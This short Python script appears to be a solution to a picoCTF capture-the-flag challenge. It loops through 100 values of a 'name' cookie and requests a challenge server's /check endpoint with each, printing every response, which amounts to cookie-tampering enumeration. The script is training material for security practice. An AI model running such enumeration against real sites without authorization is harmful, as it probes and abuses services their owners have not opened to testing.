import requests

for i in range(100):
    cookie = 'name={}'.format(i)
    headers = {'Cookie':cookie}

    r = requests.get('http://mercury.picoctf.net:64944/check', headers=headers)

    print(r.text)
